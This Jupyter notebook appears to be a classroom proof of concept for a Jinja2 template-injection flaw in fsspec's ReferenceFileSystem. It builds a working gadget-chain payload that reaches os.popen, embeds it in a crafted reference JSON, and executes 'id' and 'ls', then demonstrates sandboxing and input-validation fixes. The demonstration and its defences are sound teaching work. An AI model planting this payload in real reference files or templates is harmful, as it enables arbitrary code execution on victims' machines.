# fsspec SSTI → Remote Code Execution (CVE-2026-104851)

**SC3010 Proof-of-Concept — run locally only.**

## What is this about?

`fsspec` is a popular Python library for working with filesystems (local files, S3, etc.).
It has a feature called **ReferenceFileSystem** that lets you describe a dataset using a JSON
document — basically a map of “this chunk of data lives at this URL, at this offset.”

The bug: some fields in that JSON document are **processed as Jinja2 templates** (a Python
templating language). Jinja2 templates can do much more than simple text substitution — they
can access Python internals and **run arbitrary commands on the machine**.

So if an attacker gives you a crafted JSON reference file and you open it with fsspec,
**their code runs on your machine** — before any actual data is even read.

## The bug at a glance

| | |
|---|---|
| **CVE** | CVE-2026-104851 |
| **What can an attacker do?** | Execute any command on your computer (Remote Code Execution) |
| **Where is the bug?** | `fsspec.implementations.reference.ReferenceFileSystem` |
| **Root cause** | User-supplied JSON fields are passed into `jinja2.Template().render()` without any sandboxing or validation |
| **How is it triggered?** | Victim opens an attacker's reference file: `fsspec.filesystem("reference", fo=malicious_file)` |

## How the attack works — step by step

```
Attacker crafts a JSON file        Victim opens it with fsspec        Attacker's code runs
┌─────────────────────────┐       ┌──────────────────────────┐       ┌──────────────────────┐
│ {                       │       │ fsspec.filesystem(       │       │ The Jinja2 template  │
│   "gen": [{             │  ──►  │   "reference",           │  ──►  │ engine evaluates the │
│     "url": "{{ evil }}" │       │   fo=malicious.json      │       │ "url" field and runs │
│   }]                    │       │ )                        │       │ the embedded command │
│ }                       │       │                          │       │                      │
└─────────────────────────┘       └──────────────────────────┘       └──────────────────────┘
```

The critical insight: **the code runs during file *loading*, not during data reading.** Even
if the victim only intended to inspect metadata, the attack has already fired.

## Safety notice

- Every command in this notebook is **harmless** (`id`, `ls`, `7*7`) — just enough to prove code execution.
- Run this **only on your own machine**. This is a classroom demonstration, not a weapon.

In [2]:

# Setup: import libraries and print versions so we know what we're working with.
# NOTE: This PoC requires fsspec <= 2025.10.0 (the vulnerable version).
#       Newer versions (2026+) patched the bug by switching to SandboxedEnvironment.
#       Install the vulnerable version with: pip install 'fsspec==2025.10.0'
import json, sys
import fsspec
import jinja2

print("Python version :", sys.version.split()[0])
print("fsspec version :", fsspec.__version__)
print("Jinja2 version :", jinja2.__version__)

if fsspec.__version__ > "2025.10.0":
    print()
    print("WARNING: fsspec", fsspec.__version__, "has the patch applied.")
    print("The Step 3 exploit will NOT work. Install the vulnerable version:")
    print("  pip install 'fsspec==2025.10.0'")

Python version : 3.14.0
fsspec version : 2025.10.0
Jinja2 version : 3.1.6


## Step 1 — Prove that Jinja2 *executes* template expressions

**What is Jinja2?** A templating engine — you give it a string with `{{ ... }}` placeholders,
and it evaluates whatever is inside the braces.

**The problem:** if the string comes from an attacker, they control what gets evaluated.

Below, we pass `"{{ 7 * 7 }}"` to Jinja2. If it treats it as plain text, we'd get the literal
string `{{ 7 * 7 }}`. If it *evaluates* it, we get `49`.

In [3]:
# An attacker controls this string. It looks like data, but contains a Jinja2 expression.
attacker_field = "{{ 7 * 7 }}"

# Jinja2 evaluates it — the result is '49', not the literal '{{ 7 * 7 }}'.
# This proves that Jinja2 EXECUTES the expression, not just copies it.
rendered = jinja2.Template(attacker_field).render()
print("Input string :", attacker_field)
print("Output after render:", rendered)
print()
if rendered == "49":
    print(">>> The template was EXECUTED (7 * 7 = 49). This is the basis of the attack.")

Input string : {{ 7 * 7 }}
Output after render: 49

>>> The template was EXECUTED (7 * 7 = 49). This is the basis of the attack.


## Step 2 — Escalate from “evaluate math” to “run shell commands”

OK, so Jinja2 evaluates `{{ 7 * 7 }}`. Can we do more than math? **Yes.**

Jinja2's default environment exposes built-in objects like `cycler`. From there, an attacker
can walk Python's internal object chain to reach the `os` module:

```
cycler                          ← a Jinja2 built-in global
  .__init__                     ← its constructor (a Python function)
    .__globals__                ← all global variables visible to that function
      .os                      ← the 'os' module (it was imported by Jinja2 internally)
        .popen('id')           ← run any shell command!
          .read()              ← capture the output
```

This chain is known as a **gadget** — a path through existing code that lets you reach
dangerous functionality. The attacker just needs to express it as a Jinja2 template:

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Below, we run the `id` command (which just prints the current user — completely harmless)
to prove we achieved **arbitrary command execution** from inside a template string.

In [4]:
# Build the malicious template string.
# The command 'id' just prints the current user's identity — it's harmless.
cmd = "id"
payload = "{{ cycler.__init__.__globals__.os.popen('" + cmd + "').read() }}"

print("Payload template string:")
print(payload)
print()

# Now render it — Jinja2 will walk the gadget chain and execute the 'id' command.
rendered = jinja2.Template(payload).render()

print("What Jinja2 returned after rendering:")
print(rendered.strip())
print()
print(">>> This is the output of the 'id' shell command!")
print(">>> It shows the current user (uid), group (gid), and group memberships.")
print(">>> An attacker could replace 'id' with ANY command: download malware, steal files, etc.")

Payload template string:
{{ cycler.__init__.__globals__.os.popen('id').read() }}

What Jinja2 returned after rendering:
uid=501(xuehao) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)

>>> This is the output of the 'id' shell command!
>>> It shows the current user (uid), group (gid), and group memberships.
>>> An attacker could replace 'id' with ANY command: download malware, steal files, etc.


## Step 3 — Trigger the bug through fsspec (the real-world scenario)

Steps 1–2 showed the raw Jinja2 vulnerability. Now we show how it is **actually exploitable**
through fsspec's `ReferenceFileSystem`.

### What is a “references” document?

fsspec's reference format (used by the Kerchunk project) is a JSON file that says:
*“key X maps to file Y, at offset Z, for N bytes.”* It has a `gen` section for generating
many references from a template — for example, `data/0`, `data/1`, `data/2`, ...

The `url`, `offset`, and `length` fields in `gen` are rendered through **Jinja2** so they
can use variables like `{{i}}`. But fsspec uses **un-sandboxed** Jinja2, so an attacker can
put the gadget chain in the `url` field instead of a real URL.

### What we do below

1. **Build a malicious references JSON** — a normal-looking document, but the `url` field
   contains our SSTI payload instead of a real URL.
2. **Open it with fsspec** — just `fsspec.filesystem("reference", fo=malicious_json)`.
3. **Observe that the command ran** — the expanded reference for `data/0` contains the
   *output of the shell command*, not a URL.

In [5]:
# --- Build the malicious references document ---
# This is what an attacker would host or email to a victim.
# It looks like a normal Kerchunk reference file, but the "url" field is a payload.

cmd = "ls"   # harmless command: just lists files in the current directory
ssti = "{{ cycler.__init__.__globals__.os.popen('" + cmd + "').read() }}"

malicious_references = {
    "version": 1,
    "templates": {},
    "gen": [
        {
            "key": "data/{{i}}",       # normal: generates keys like data/0, data/1, ...
            "url": ssti,               # MALICIOUS: this should be a URL, but it's a payload
            "offset": "0",
            "length": "0",
            "dimensions": {"i": {"stop": 1}},   # generate just one entry (i=0)
        }
    ],
    "refs": {},
}

print("This is what the malicious JSON document looks like:")
print(json.dumps(malicious_references, indent=2))
print()
print('Notice the \"url\" field \u2014 instead of \"s3://bucket/file\", it contains the SSTI payload.')

This is what the malicious JSON document looks like:
{
  "version": 1,
  "templates": {},
  "gen": [
    {
      "key": "data/{{i}}",
      "url": "{{ cycler.__init__.__globals__.os.popen('ls').read() }}",
      "offset": "0",
      "length": "0",
      "dimensions": {
        "i": {
          "stop": 1
        }
      }
    }
  ],
  "refs": {}
}

Notice the "url" field — instead of "s3://bucket/file", it contains the SSTI payload.


In [7]:
# --- The victim opens the malicious document ---
# This single line is all it takes. The payload fires during filesystem construction.
# No data is read, no file is downloaded — the attack runs at LOAD TIME.

fs = fsspec.filesystem("reference", fo=malicious_references)

# --- Check what happened ---
# The expanded reference for key "data/0" should contain a [url, offset, length] list.
# Normally the url would be something like "s3://bucket/chunk_0".
# Instead, it contains the OUTPUT of the 'ls' command — proving code execution.

result = fs.references.get("data/0")
print("What fsspec stored for 'data/0':")
print(result)
print()
print("Breakdown:")
print(f"  result[0] = {result[0]!r}  \u2190 This SHOULD be a URL, but it's the 'ls' command output!")
print(f"  result[1] = {result[1]}             \u2190 offset (0)")
print(f"  result[2] = {result[2]}             \u2190 length (0)")
print()
print(">>> The shell command ran during fsspec.filesystem() \u2014 the attacker achieved RCE.")
print(">>> The victim never had to read any data. Just opening the reference file was enough.")

What fsspec stored for 'data/0':
['README.md\n\x1bdocs\x1b[m\x1b[m\nfsspec_reference_ssti.ipynb\n', 0, 0]

Breakdown:
  result[0] = 'README.md\n\x1bdocs\x1b[m\x1b[m\nfsspec_reference_ssti.ipynb\n'  ← This SHOULD be a URL, but it's the 'ls' command output!
  result[1] = 0             ← offset (0)
  result[2] = 0             ← length (0)

>>> The shell command ran during fsspec.filesystem() — the attacker achieved RCE.
>>> The victim never had to read any data. Just opening the reference file was enough.


## Step 4 — How to fix it

Two independent fixes are shown below. Either one blocks the attack; using both is best (defense in depth).

### Fix A: Use a sandboxed Jinja2 environment

Jinja2 provides `ImmutableSandboxedEnvironment` — a restricted mode that **blocks access to
dangerous attributes** like `__init__`, `__globals__`, etc. The template `{{ 7 * 7 }}` still
works, but the gadget chain is blocked.

If fsspec used the sandbox instead of the default environment, the attack would fail.

In [8]:
from jinja2.sandbox import ImmutableSandboxedEnvironment

sandbox = ImmutableSandboxedEnvironment()

# Try to render the malicious payload inside the sandbox:
print("Attempting to render the SSTI payload in a sandboxed environment...")
try:
    sandbox.from_string(ssti).render()
    print("UNEXPECTED: payload was not blocked!")
except Exception as e:
    print(f"BLOCKED! {type(e).__name__}: {e}")

print()

# Normal templates still work — the sandbox only blocks dangerous attribute access:
benign_result = sandbox.from_string("chunk_{{ i }}").render(i=3)
print(f"Normal template 'chunk_{{{{ i }}}}' with i=3 \u2192 '{benign_result}'")
print()
print(">>> The sandbox stops the attack while allowing legitimate templates to work.")

Attempting to render the SSTI payload in a sandboxed environment...
BLOCKED! SecurityError: access to attribute '__init__' of 'type' object is unsafe.

Normal template 'chunk_{{ i }}' with i=3 → 'chunk_3'

>>> The sandbox stops the attack while allowing legitimate templates to work.


### Fix B: Validate template fields before rendering

Instead of (or in addition to) sandboxing, **reject any template expression that contains
suspicious patterns** — attribute access (`.`), dunder names (`__`), function calls (`(`),
or subscripts (`[`). Only allow known variables (like the `i` from `dimensions`).

In [9]:
import re

# These patterns should never appear in a legitimate data template:
#   __   -> dunder attributes (used to access Python internals)
#   .    -> attribute access (used to walk the gadget chain)
#   (    -> function calls (used to call os.popen)
#   [    -> subscript access
FORBIDDEN = re.compile(r"__|\.|\(|\[")

def safe_field(template_str, allowed_vars):
    """Check a template string and reject it if it contains anything suspicious."""
    for expr in re.findall(r"{{(.*?)}}", template_str):
        expr = expr.strip()
        if FORBIDDEN.search(expr):
            raise ValueError(f"REJECTED -- unsafe expression: {expr!r}")
        if expr not in allowed_vars:
            raise ValueError(f"REJECTED -- unknown variable: {expr!r}")
    return template_str

allowed = {"i"}   # only 'i' is a valid variable (from the gen dimensions)

# Test with a normal template -- should pass:
print("Testing 'data/{{i}}' (benign):")
print(f"  Result: {safe_field('data/{{i}}', allowed)}")
print()

# Test with the malicious payload -- should be rejected:
print("Testing the SSTI payload:")
try:
    safe_field(ssti, allowed)
except ValueError as e:
    print(f"  {e}")
print()
print(">>> The validator catches the attack before Jinja2 ever sees it.")

Testing 'data/{{i}}' (benign):
  Result: data/{{i}}

Testing the SSTI payload:
  REJECTED -- unsafe expression: "cycler.__init__.__globals__.os.popen('ls').read()"

>>> The validator catches the attack before Jinja2 ever sees it.


## Summary

### What was the bug?
fsspec's `ReferenceFileSystem` takes a JSON document describing data locations. Fields in that
document's `gen` section are run through Jinja2's template engine **without sandboxing**. An
attacker places a malicious Jinja2 expression in the `url` field, and it executes as Python
code when the victim opens the file.

### What did our exploit retrieve?
- **Step 1:** `{{ 7 * 7 }}` → `49` — proved Jinja2 executes expressions, not just substitutes text.
- **Step 2:** The gadget chain reached `os.popen('id')` → returned the current user's identity
  (uid, groups). This proves **arbitrary shell commands** can run inside a template.
- **Step 3:** Through fsspec, the `ls` command's output appeared where a URL should be — proving
  the attack works end-to-end through the real library, triggered by simply loading a JSON file.

### Why is this dangerous?
- **Data-as-code:** A JSON config file (data) gets treated as executable code. The victim thinks
  they're loading a data descriptor, but they're running the attacker's commands.
- **Fires at load time:** The attack runs during `fsspec.filesystem(...)` — before any data is
  read. “I only opened the file to check it” is not a defense.
- **No special permissions needed:** The attacker just needs the victim to open their JSON file.

### How to fix it
1. **Sandbox the template engine** — use `jinja2.sandbox.ImmutableSandboxedEnvironment` instead
   of the default `jinja2.Template`.
2. **Validate inputs** — reject any template expression containing `.`, `__`, `(`, or `[` before
   rendering.
3. **Don't open untrusted reference files** — treat them like executables, not data.